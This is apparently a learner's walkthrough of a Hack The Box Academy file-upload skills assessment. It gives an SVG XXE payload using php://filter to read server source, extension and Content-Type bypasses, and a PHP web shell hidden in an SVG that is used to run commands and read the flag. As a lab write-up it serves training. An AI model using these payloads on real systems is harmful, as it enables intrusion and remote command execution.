# File Upload Attacks — Skills Assessment

**Platform:** Hack The Box Academy  
**Module:** File Upload Attacks  
**Assessment:** Skills Assessment  
**Difficulty:** Medium  
**OS:** Linux (Apache + PHP)  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|--------|
| 1 | Browse to `/contact` — upload image — inspect reflected link | Upload confirmed; full path not disclosed — uploads directory unknown |
| 2 | Burp Intruder — fuzz PHP extensions on `filename` field | `.pht`, `.phtm`, `.phar`, `.pgif` pass without "Extension not allowed" |
| 3 | Burp Intruder — fuzz `Content-Type` header against image content-types | `image/jpg`, `image/jpeg`, `image/png`, `image/svg+xml` accepted |
| 4 | Craft `shell.svg` with XXE PHP filter payload → rename to `.jpeg` → intercept → restore `.svg` + `image/svg+xml` | Source code of `upload.php` returned as base64 |
| 5 | Decode base64 → read `upload.php` | Upload dir `./user_feedback_submissions/`, filename prefix `ymd_`, all 3 validation layers mapped |
| 6 | Craft `shell.phar.jpeg` with combined SVG + PHP web shell → intercept → restore `shell.phar.svg` + `image/svg+xml` | Web shell uploaded to `user_feedback_submissions/YMD_shell.phar.svg` |
| 7 | `?cmd=ls+/` via web shell URL | Flag filename `flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt` discovered |
| 8 | `?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt` | Flag captured |

---

## Network Topology

```
[Attack Host: 10.10.16.36]
        ↓ Browser + Burp Suite (FoxyProxy → BURP profile on 127.0.0.1:8080)
[Target: 10.129.43.173:53577]
  └── /contact/                         ← Contact Us page — image upload form
  └── /contact/upload.php               ← Upload handler — 3-layer validation
  └── /contact/user_feedback_submissions/  ← Upload directory (discovered via XXE)
       └── YMD_shell.phar.svg           ← Web shell (executed via Apache FilesMatch)
```

---

## Question 1 — Read the Flag in the Root Directory

**Question:** "Try to exploit the upload form to read the flag found at the root directory '/'." 

---

### Step 1 — Identify the Upload Surface

Navigate to `http://10.129.43.173:53577` and click **Contact Us**. The page presents an image upload form. Upload any valid image — it is immediately displayed after clicking the green upload icon without requiring form submission.

Inspect the reflected image's URL in the browser. The image is encoded as a base64 data URI:

```
data:image/jpeg;base64,/9j/4AAQSkZJRgABAQ...
```

The full server-side file path is not disclosed in the response — the uploads directory is completely hidden. This means we cannot simply upload a web shell and visit its URL directly. **The upload directory must be discovered through another technique.**

---

### Step 2 — Fuzz PHP Extensions with Burp Intruder

Start Burp Suite and set FoxyProxy to the **BURP** profile. Upload a legitimate image and intercept the upload request. Send it to Intruder (`CTRL+I`).

In the **Positions** tab:
- Click **Clear §** to remove all auto-detected markers
- Locate `filename="HTB.jpg"` in the request body
- Set the payload marker around the extension only: `filename="HTB§.jpg§"`

> This tests whether different extensions are accepted — the dot is kept outside the marker so it remains constant, and only what comes before it is fuzzed.

In the **Payloads** tab:
- Download the PHP extensions wordlist:

```bash
Hackerpatel007_1@htb[/htb]$ wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.txt
```

- Load `extensions.txt` as the payload list
- **Uncheck** "URL-encode these characters" — encoding the dot would break the filename

Click **Start Attack**. Sort results by **Length**. Three distinct response patterns appear:

| Response | Meaning | Extensions |
|----------|---------|----------|
| Contains `Extension not allowed` | Blacklisted — rejected | `.php`, `.php7`, `.phtml`, etc. |
| Contains `Only images are allowed` | Passed blacklist but failed whitelist | `.pht`, `.phtm`, `.phar`, `.pgif` |
| File successfully uploaded | Fully accepted | `.jpg`, `.jpeg`, `.png`, `.gif` |

The extensions `.pht`, `.phtm`, `.phar`, and `.pgif` are **not blacklisted but also not whitelisted** — they pass the blacklist check (`Extension not allowed` never appears) but fail the whitelist's image-extension-only check. This reveals that the back-end has both a blacklist and a whitelist in play simultaneously, and these extensions fall through the gap.

> **Key insight:** `.phar` (PHP Archive) can execute PHP code on most Apache+PHP configurations. We will use it as the PHP execution vehicle.

---

### Step 3 — Fuzz the Content-Type Header

Since the whitelist only permits image-extension filenames, the approach is to name the shell `shell.phar.jpg` — ending with `.jpg` to pass the whitelist. But additional content-type validation may still block it. We need to identify which `Content-Type` values the server accepts.

In Intruder **Positions**, set the marker around the `Content-Type` value:

```
Content-Type: §image/jpeg§
```

Download and filter the content-type wordlist to image types only:

```bash
Hackerpatel007_1@htb[/htb]$ wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt
Hackerpatel007_1@htb[/htb]$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

Load `image-content-types.txt` in Payloads. Uncheck URL-encode. Start Attack.

Sort by **Length**. Most responses are identical in size and contain `Only images are allowed`. The exceptions — responses that indicate a successful upload — are:

```
image/jpg
image/jpeg
image/png
image/svg+xml      ← Critical finding
```

`image/svg+xml` is accepted — and SVG files are XML-based, meaning they support XML external entities. This opens the door for **SVG XXE injection**.

---

### Step 4 — Read upload.php Source Code via SVG XXE

With `image/svg+xml` accepted as a valid Content-Type, and the uploaded image reflected back in the response, we can inject an XXE payload inside an SVG file to read server-side files.

**Goal at this stage:** Read the source code of `upload.php` to discover the uploads directory path and the filename naming convention — both required to locate our web shell after upload.

**Craft the XXE SVG payload using PHP filter wrapper:**

```bash
Hackerpatel007_1@htb[/htb]$ cat << 'EOF' > shell.svg
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>
EOF
```

The `php://filter/convert.base64-encode/resource=upload.php` wrapper reads the PHP source code and base64-encodes it — making it XML-safe (PHP's `<?php` tags contain characters that would break XML parsing if unencoded).

**Rename to `.jpeg` to bypass front-end restriction:**

```bash
Hackerpatel007_1@htb[/htb]$ mv shell.svg shell.jpeg
```

The front-end file selector rejects `.svg` — renaming to `.jpeg` lets us select and queue the file for upload. The actual extension and Content-Type will be restored via Burp before the request reaches the server.

**Intercept the upload request in Burp and restore the SVG identity:**

Modify two fields in the intercepted multipart request:

```http
Content-Disposition: form-data; name="uploadFile"; filename="shell.svg"
Content-Type: image/svg+xml
```

Forward the modified request. The server processes the SVG, the XML parser resolves the `&xxe;` entity, reads `upload.php`, base64-encodes it, and substitutes it into the `<svg>` element — which is then reflected back in the response as the displayed "image."

**The response contains the base64-encoded source of `upload.php`.**

---

### Step 5 — Decode and Analyse upload.php Source Code

Decode the base64 response to reveal the full PHP source:

```bash
Hackerpatel007_1@htb[/htb]$ echo 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMu...' | base64 -d
```

**Decoded `upload.php` source:**

```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```

**Critical findings from the source code:**

| Discovery | Value | Significance |
|-----------|-------|-------------|
| Upload directory | `./user_feedback_submissions/` | Full server-side path of uploaded files |
| Filename prefix | `date('ymd')` → e.g. `221130_` | Files are stored as `YYMMDD_originalname` |
| Blacklist regex | `/.+\.ph(p\|ps\|tml)/` | Blocks `.php`, `.phps`, `.phtml` — but NOT `.phar`, `.pht`, `.pgif` |
| Whitelist regex | `/^.+\.[a-z]{2,3}g$/` | Requires filename to end in 2-3 lowercase letters + `g` — e.g. `.jpg`, `.png`, `.svg` |
| Type validation | Both `Content-Type` header AND MIME type checked | Both must match `image/[a-z]{2,3}g` pattern |

**Regex analysis — the double vulnerability:**

The whitelist regex `/^.+\.[a-z]{2,3}g$/` matches filenames ending in patterns like `.jpg`, `.png`, `.svg`. Critically, `.phar.svg` ends with `.svg` → passes the whitelist. And the blacklist `/.+\.ph(p|ps|tml)/` does not include `.phar` → passes the blacklist.

**The exploitation path is now clear:**
- Filename: `shell.phar.svg` → ends with `.svg` (passes whitelist) + contains no blacklisted `.ph(p|ps|tml)` pattern
- Content-Type: `image/svg+xml` → passes type validation
- The file is stored as `YYMMDD_shell.phar.svg` in `/contact/user_feedback_submissions/`
- Apache executes `.phar` files as PHP (confirmed in Step 2 — `.phar` was not blacklisted by extension)

---

### Step 6 — Upload the Combined SVG + PHP Web Shell

Now that the full validation logic is known, craft the final weaponised payload — an SVG file that embeds a PHP web shell. When Apache serves this file, it recognises `.phar` in the filename and executes the PHP block:

```bash
Hackerpatel007_1@htb[/htb]$ cat << 'EOF' > shell.phar.svg
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
EOF
```

The file contains two distinct components:
1. **The SVG/XXE block** — satisfies all three validation checks (valid XML + SVG structure, `image/svg+xml` MIME type, `.svg` extension ending)
2. **The PHP web shell** — appended after the SVG closing tag. Ignored by the XML parser but executed by PHP when Apache processes the `.phar.svg` file via its `FilesMatch` handler

**Rename to `.jpeg` for front-end bypass:**

```bash
Hackerpatel007_1@htb[/htb]$ mv shell.phar.svg shell.phar.jpeg
```

**Intercept the upload request and restore the true identity:**

```http
Content-Disposition: form-data; name="uploadFile"; filename="shell.phar.svg"
Content-Type: image/svg+xml
```

Forward the request. The server:
1. Receives `filename="shell.phar.svg"` — passes blacklist (no `.php/.phps/.phtml`) ✅
2. Checks whitelist: ends in `.svg` ✅
3. Checks Content-Type `image/svg+xml` + MIME type of file (SVG structure detected) ✅
4. Stores file as `221130_shell.phar.svg` in `./user_feedback_submissions/`

The file is now live on the server.

---

### Step 7 — Determine the Exact Filename and Execute Commands

The filename prefix is today's date in `ymd` format. Calculate it:

```bash
Hackerpatel007_1@htb[/htb]$ date +%y%m%d
221130
```

The web shell is accessible at:

```
http://10.129.43.173:53577/contact/user_feedback_submissions/221130_shell.phar.svg?cmd=COMMAND
```

**Confirm RCE with `id`:**

```
http://10.129.43.173:53577/contact/user_feedback_submissions/221130_shell.phar.svg?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

OS command execution confirmed as `www-data`.

**List the root directory to locate the flag:**

```
http://10.129.43.173:53577/contact/user_feedback_submissions/221130_shell.phar.svg?cmd=ls+/
```

```
bin
boot
dev
etc
flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
home
lib
...
```

The flag file is present at the root: `flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt`

---

### Step 8 — Read the Flag

```
http://10.129.43.173:53577/contact/user_feedback_submissions/221130_shell.phar.svg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
```

```
HTB{flag_redacted}
```

> **Answer:** `HTB{flag_redacted}`

---

## Flags

| Question | Description | Answer |
|----------|-------------|--------|
| Q1 — Root directory flag | Flag at `/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt` via web shell | `HTB{flag_redacted}` |

---

## Lessons Learned

- **When the upload directory is hidden, XXE via SVG is the reconnaissance tool.** Images reflected back as base64 data URIs reveal nothing about the server-side path — but an SVG containing a PHP filter XXE payload reads any file the web server user can access, including the upload handler's source code. This technique turns a limited SVG upload into a full whitebox analysis of the validation logic.

- **Reading the upload handler source code is always worth doing before attempting RCE.** Decoding `upload.php` revealed the upload directory (`./user_feedback_submissions/`), the filename prefix format (`ymd_`), and the exact regex patterns for all three validation layers — blacklist, whitelist, and MIME type. Without this, the web shell path would have been unknown even after a successful upload.

- **Understanding the exact regex is critical for crafting the bypass filename.** The whitelist `/^.+\.[a-z]{2,3}g$/` requires endings like `.jpg`, `.png`, `.svg` — but `.phar.svg` also matches because it ends with `.svg`. The blacklist `/.+\.ph(p|ps|tml)/` does not include `.phar`. This intersection — not blacklisted AND passes whitelist — is the precise bypass window.

- **The `date('ymd')` filename prefix is deterministic.** Knowing the format in advance means the full upload path is computable before even uploading — `YYMMDD_filename.ext`. Always look for deterministic naming patterns in upload source code; they eliminate the need for upload directory brute-forcing.

- **Combining SVG structure with a PHP web shell in a single file exploits two parser contexts.** The XML parser validates and renders the SVG block — satisfying all type checks. Apache's `FilesMatch` handler then recognises `.phar` and passes the entire file to PHP — which executes the appended `<?php system($_REQUEST['cmd']); ?>` block. The SVG content is output as text before the command result, which is expected and harmless.

- **Three-layer validation (blacklist + whitelist + MIME type) is still bypassable.** The critical insight is that the MIME type check uses a regex `/image\/[a-z]{2,3}g/` that `image/svg+xml` satisfies, and SVG files are legitimate XML images — so a file with SVG XML structure genuinely passes MIME type inspection. The vulnerability is the assumption that a valid SVG is a safe upload.

- **Burp Intruder fuzzing both the extension AND Content-Type sequentially is the structured approach.** Starting with extension fuzzing identifies the gap in the blacklist (`.phar` not blocked). Then Content-Type fuzzing identifies `image/svg+xml` as an accepted type. Each fuzzing round narrows the bypass combination — avoiding trial-and-error guessing.

---

## Full Attack Chain Reference

```
http://10.129.43.173:53577/contact → upload image → reflected as base64 data URI
        ↓
Upload directory path unknown — need XXE reconnaissance first
        ↓
Burp Intruder → fuzz PHP extensions on filename
→ .pht, .phtm, .phar, .pgif pass blacklist but fail whitelist
        ↓
Burp Intruder → fuzz Content-Type header with image/ types
→ image/svg+xml accepted → SVG XXE is viable
        ↓
Craft shell.svg with PHP filter XXE: php://filter/convert.base64-encode/resource=upload.php
mv shell.svg shell.jpeg (front-end bypass)
        ↓
Intercept → restore: filename="shell.svg" + Content-Type: image/svg+xml
        ↓
Response: base64-encoded upload.php source code
        ↓
echo '<base64>' | base64 -d → decoded upload.php reveals:
  - Upload dir: ./user_feedback_submissions/
  - Filename prefix: date('ymd') → e.g. 221130_
  - Blacklist: /.+\.ph(p|ps|tml)/ → .phar NOT blacklisted
  - Whitelist: /^.+\.[a-z]{2,3}g$/ → .phar.svg ends with .svg → passes
  - MIME type: /image\/[a-z]{2,3}g/ → image/svg+xml → passes
        ↓
Craft shell.phar.svg: SVG/XXE block + <?php system($_REQUEST['cmd']); ?>
mv shell.phar.svg shell.phar.jpeg (front-end bypass)
        ↓
Intercept → restore: filename="shell.phar.svg" + Content-Type: image/svg+xml
        ↓
File stored as: /contact/user_feedback_submissions/221130_shell.phar.svg
        ↓
?cmd=id → uid=33(www-data) → RCE confirmed
        ↓
?cmd=ls+/ → flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt discovered
        ↓
?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
→ HTB{flag_redacted}
```

---

## Commands Reference

| Command | Purpose |
|---------|--------|
| `wget https://raw.githubusercontent.com/.../extensions.txt` | Download PHP extension bypass wordlist |
| `wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt` | Download all content-types wordlist |
| `cat web-all-content-types.txt \| grep 'image/' > image-content-types.txt` | Filter image MIME types for Content-Type fuzzing |
| `cat web-all-content-types.txt \| grep 'image/' \| xclip -se c` | Copy image content-types directly to clipboard for Burp |
| `cat << 'EOF' > shell.svg` | Write SVG XXE payload to file using heredoc |
| `echo '<base64>' \| base64 -d` | Decode base64-encoded PHP source returned by XXE |
| `mv shell.svg shell.jpeg` | Rename to bypass front-end file extension restriction |
| `mv shell.phar.svg shell.phar.jpeg` | Rename combined shell to bypass front-end restriction |
| `date +%y%m%d` | Calculate today's `ymd` filename prefix (e.g. `221130`) |
| `?cmd=id` | Confirm RCE — verify `www-data` execution context |
| `?cmd=ls+/` | List root directory to locate flag file |
| `?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt` | Read flag file via web shell |

---

## Validation Bypass Logic — Summary Table

| Validation Layer | Mechanism | Bypass Used |
|-----------------|-----------|------------|
| Front-end extension filter | `accept=".jpg,.jpeg,.png"` in HTML input | Rename to `.jpeg` locally; restore `.svg` in Burp intercept |
| Back-end blacklist | `/.+\.ph(p\|ps\|tml)/` | Use `.phar` — not included in blacklist |
| Back-end whitelist | `/^.+\.[a-z]{2,3}g$/` | Use `shell.phar.svg` — ends with `.svg` which matches the pattern |
| Content-Type check | `$_FILES['uploadFile']['type']` | Set `Content-Type: image/svg+xml` in Burp |
| MIME type check | `mime_content_type()` on actual file bytes | SVG XML structure genuinely resolves as `image/svg+xml` |
| File size limit | `> 500000` bytes | Keep payload minimal — well under 500KB |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1190 | — | Exploit Public-Facing Application — chained file upload bypass via extension + MIME manipulation |
| T1083 | — | File and Directory Discovery — XXE SVG reading `upload.php` to discover upload directory and naming convention |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files — PHP source code exfiltrated via SVG XXE `php://filter` wrapper |
| T1505 | T1505.003 | Server Software Component: Web Shell — `shell.phar.svg` uploaded and executed as PHP via Apache FilesMatch handler |
| T1059 | T1059.004 | Command and Scripting Interpreter: Unix Shell — OS commands executed via `?cmd=` on uploaded web shell |
| T1027 | T1027.001 | Obfuscated Files or Information — SVG XML content disguises PHP payload from MIME type validators |
| T1036 | T1036.008 | Masquerading: Masquerade File Type — `.phar.svg` bypasses extension validation while retaining PHP execution capability |
| T1005 | — | Data from Local System — flag file read via `cat` executed through the web shell |

---

*Part of the HTB Academy CPTS path — File Upload Attacks module.*  
*Penetration Tester role in India | Target: January 2027*
